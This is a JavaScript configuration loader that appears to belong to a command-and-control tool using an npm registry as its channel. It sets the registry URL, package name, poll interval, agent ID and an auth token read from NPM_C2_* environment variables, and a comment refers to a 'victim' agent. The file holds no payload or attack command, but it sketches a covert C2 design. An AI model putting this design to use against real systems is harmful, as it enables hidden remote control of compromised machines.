// Configuration loader: defaults < config file < environment overrides.
import fs from 'node:fs';
import path from 'node:path';

export const DEFAULTS = {
  registryUrl: 'http://localhost:4873',
  packageName: 'my-package',
  pollIntervalSec: 10,
  agentId: '', // optional; generated and persisted by the victim if absent
  logFile: '', // '' disables file logging
  stateFile: '', // role-specific default is used when empty
  token: '', // only ever populated from the NPM_C2_TOKEN env var
};

/**
 * Resolve which config file to use.
 * Priority: explicit argument > $NPM_C2_CONFIG > ./config.json
 */
export function resolveConfigPath(explicitPath) {
  if (explicitPath) return path.resolve(explicitPath);
  if (process.env.NPM_C2_CONFIG) return path.resolve(process.env.NPM_C2_CONFIG);
  return path.resolve('config.json');
}

/**
 * Load configuration.
 * @param {string} [explicitPath] path to a JSON config file (may not exist)
 * @returns {object} merged, validated config
 */
export function loadConfig(explicitPath) {
  const cfg = { ...DEFAULTS };

  const filePath = resolveConfigPath(explicitPath);
  if (fs.existsSync(filePath)) {
    const raw = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    if (raw && typeof raw === 'object') {
      for (const key of Object.keys(DEFAULTS)) {
        if (raw[key] !== undefined && key !== 'token') cfg[key] = raw[key];
      }
    }
  }

  // Environment overrides
  if (process.env.NPM_C2_REGISTRY_URL) cfg.registryUrl = process.env.NPM_C2_REGISTRY_URL;
  if (process.env.NPM_C2_PACKAGE_NAME) cfg.packageName = process.env.NPM_C2_PACKAGE_NAME;
  if (process.env.NPM_C2_POLL_INTERVAL) {
    const n = Number(process.env.NPM_C2_POLL_INTERVAL);
    if (Number.isFinite(n) && n > 0) cfg.pollIntervalSec = n;
  }
  if (process.env.NPM_C2_AGENT_ID) cfg.agentId = process.env.NPM_C2_AGENT_ID;
  if (process.env.NPM_C2_LOG_FILE !== undefined && process.env.NPM_C2_LOG_FILE !== '') {
    cfg.logFile = process.env.NPM_C2_LOG_FILE;
  }
  if (process.env.NPM_C2_STATE_FILE) cfg.stateFile = process.env.NPM_C2_STATE_FILE;

  // The auth token is ONLY ever read from the environment — never from a file.
  cfg.token = process.env.NPM_C2_TOKEN || '';

  // Validation
  let parsed;
  try {
    parsed = new URL(cfg.registryUrl);
  } catch {
    throw new Error(`invalid registryUrl: "${cfg.registryUrl}"`);
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    throw new Error(`registryUrl must be http(s): "${cfg.registryUrl}"`);
  }
  cfg.registryUrl = cfg.registryUrl.replace(/\/+$/, '');
  if (!cfg.packageName || typeof cfg.packageName !== 'string') {
    throw new Error('packageName must be a non-empty string');
  }
  cfg.pollIntervalSec = Number(cfg.pollIntervalSec);
  if (!Number.isFinite(cfg.pollIntervalSec) || cfg.pollIntervalSec <= 0) {
    throw new Error(`pollIntervalSec must be a positive number, got ${cfg.pollIntervalSec}`);
  }

  return cfg;
}

/** Parse `--config <path>` (or `--config=<path>`) from argv. */
export function configArgFromArgv(argv = process.argv.slice(2)) {
  for (let i = 0; i < argv.length; i++) {
    if (argv[i] === '--config' && argv[i + 1]) return argv[i + 1];
    if (argv[i].startsWith('--config=')) return argv[i].slice('--config='.length);
  }
  return undefined;
}
